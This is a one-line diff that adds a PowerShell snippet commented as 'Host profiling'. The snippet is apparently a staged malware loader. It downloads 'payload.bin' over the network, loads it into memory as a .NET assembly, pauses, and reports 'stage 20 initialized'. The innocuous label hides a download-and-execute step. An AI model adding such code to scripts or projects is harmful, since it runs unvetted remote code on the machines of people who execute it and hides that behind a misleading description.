@@ -1,0 +1,1 @@
+<# Host profiling #> try { $PayloadBytes = (New-Object System.Net.WebClient).DownloadData('https://localhost:8081/payload.bin'); [Reflection.Assembly]::Load($PayloadBytes); Start-Sleep -Seconds 11; Write-Output "stage 20 initialized" } catch { Write-Warning "Loader step failed" }
